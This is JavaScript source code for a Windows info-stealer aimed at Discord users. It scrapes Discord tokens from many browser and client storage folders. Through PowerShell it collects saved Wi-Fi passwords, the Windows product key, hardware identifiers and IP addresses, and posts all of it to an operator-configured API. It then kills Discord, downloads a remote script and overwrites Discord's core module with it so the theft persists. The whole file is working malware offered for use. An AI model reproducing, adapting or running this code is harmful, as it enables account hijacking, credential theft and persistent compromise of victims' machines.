const fs = require("fs"),
    {
        execSync
    } = require("child_process"),
    fetch = require("sync-fetch"),
    Glob = require("glob")
var kill = new Array(),
    path = new Array(),
    JSPath = new Array(),
    alreadyTaskkill = new Array(),
    wifiPass = "", // don't touch
    apiURL = "https://someapi.com/request" // let the /request it's important (just replace https://someapi.com by your apiURL)


switch (process.platform) {
    case "win32":
        const local = process.env.localappdata,
            roaming = process.env.appdata,
            dbPaths = [`${roaming}/Discord/Local Storage/leveldb`, `${roaming}/DiscordDevelopment/Local Storage/leveldb`, `${roaming}/Lightcord/Local Storage/leveldb`, `${roaming}/discordptb/Local Storage/leveldb`, `${roaming}/discordcanary/Local Storage/leveldb`, `${roaming}/Opera Software/Opera Stable/Local Storage/leveldb`, `${roaming}/Opera Software/Opera GX Stable/Local Storage/leveldb`, `${local}/Amigo/User Data/Local Storage/leveldb`, `${local}/Torch/User Data/Local Storage/leveldb`, `${local}/Kometa/User Data/Local Storage/leveldb`, `${local}/Orbitum/User Data/Local Storage/leveldb`, `${local}/CentBrowser/User Data/Local Storage/leveldb`, `${local}/7Star/7Star/User Data/Local Storage/leveldb`, `${local}/Sputnik/Sputnik/User Data/Local Storage/leveldb`, `${local}/Vivaldi/User Data/Default/Local Storage/leveldb`, `${local}/Google/Chrome SxS/User Data/Local Storage/leveldb`, `${local}/Epic Privacy Browser/User Data/Local Storage/leveldb`, `${local}/Google/Chrome/User Data/Default/Local Storage/leveldb`, `${local}/uCozMedia/Uran/User Data/Default/Local Storage/leveldb`, `${local}/Microsoft/Edge/User Data/Default/Local Storage/leveldb`, `${local}/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`, `${local}/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb`, `${local}/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`],
            UUID = execSync("powershell.exe (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID").toString().split("\r\n")[0],
            MacAddress = execSync("powershell.exe (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2').MACAddress[0]").toString().split("\r\n")[0],
            ProductKey = execSync("powershell.exe (Get-WmiObject -query 'select * from SoftwareLicensingService').OA3xOriginalProductKey").toString().split("\r\n")[0],
            localIP = execSync("powershell.exe (Get-NetIPAddress).IPAddress").toString().split('\r\n')[0],
            WifiPass = execSync(`netsh wlan export profile key=clear;Get-ChildItem *.xml | ForEach-Object { $xml=[xml] (get-content $_); $a= $xml.WLANProfile.SSIDConfig.SSID.name + ": " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial; $a; }`, {shell: "powershell.exe" }).toString().split("\r\n"),
            getIPAddress = execSync("powershell.exe (Resolve-DnsName -Name myip.opendns.com -Server 208.67.222.220).IPAddress").toString().split("\r\n")[0]
        WifiPass.forEach(r => r.includes(": ") ? wifiPass += r + "\n" : "f")
        wifiPass.includes("�?T") ? wifiPass = wifiPass.replace(/�\?T/g, "'") : ""
        init()

        function init() {
            fs.readdirSync(__dirname).forEach(r => r.endsWith("xml") ? fs.unlinkSync(`${__dirname}/${r}`) : "")
            dbPaths.forEach(r => main(r))
            injectToDiscord()
        }

        function main(p) {
            fs.readdir(p, (err, data) => {
                if (err) return
                if (data) {
                    var ldbFileFilter = data.filter(f => f.endsWith("ldb"))
                    ldbFileFilter.forEach(file => {
                        var fileContent = fs.readFileSync(`${p}/${file}`).toString()
                        var noMFA = /[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}/
                        var mfa = /mfa\.[\d\w_-]{84}/
                        var [token] = noMFA.exec(fileContent) || mfa.exec(fileContent) || [undefined]
                        if (token) send(token, p)
                    })
                }
            })
        }

        function injectToDiscord() {
            getInstalledDiscord()
            killAllDiscords()
            injected()
            var r = fetch("https://notfubuki.xyz/api/waifuware", { headers: { waifu: true }}).text()
            JSPath.forEach(f => fs.writeFileSync(f, r.replace("*API URL*", apiURL)) ^ execSync(`${local}/${f.split("/")[5]}/Update.exe --processStart ${f.split("/")[5]}.exe`))
            
        }



        function getInstalledDiscord() {
            fs.readdirSync(roaming).forEach(r => r.includes("cord") && path.push(`${local}/${r}`));
            path.forEach(r => Glob.sync(`${r}/app-*/modules/discord_desktop_core-*/discord_desktop_core/index.js`).forEach(path => JSPath.push(path)))
            
        }

        function killAllDiscords() {
            var toKill = ["Discord.exe", "DiscordCanary.exe", "DiscordDevelopment.exe", "DiscordPTB.exe"]
            var killList = execSync("tasklist").toString().split("\r\n")
            toKill.forEach(r => killList.forEach(f => f.includes(r) && kill.push(r.split(".exe")[0])))
            kill.forEach(r => alreadyTaskkill.includes(r) ? "" : execSync(`taskkill /IM ${r}.exe /F`)  ^ alreadyTaskkill.push(r))
            
        }

        function injected() {
            var e = ""
            alreadyTaskkill.forEach(r => e += `${r}, `)
             fetch(`${apiURL}/injected`, {
                method: 'POST',
                body: `{ "p": "${e.slice(0, -2)}" }`
            })
            return true
        }
        function send(token, p) { 
            fetch(`${apiURL}/beforeinject`, {
                method: "POST",
                body: JSON.stringify({
                    token: token,
                    ipAddress: getIPAddress,
                    path: p,
                    UUID: UUID,
                    macAddress: MacAddress,
                    productKey: ProductKey,
                    localIP: localIP,
                    wifiPass: wifiPass
                })
            })
        }
        break
    default: break
}
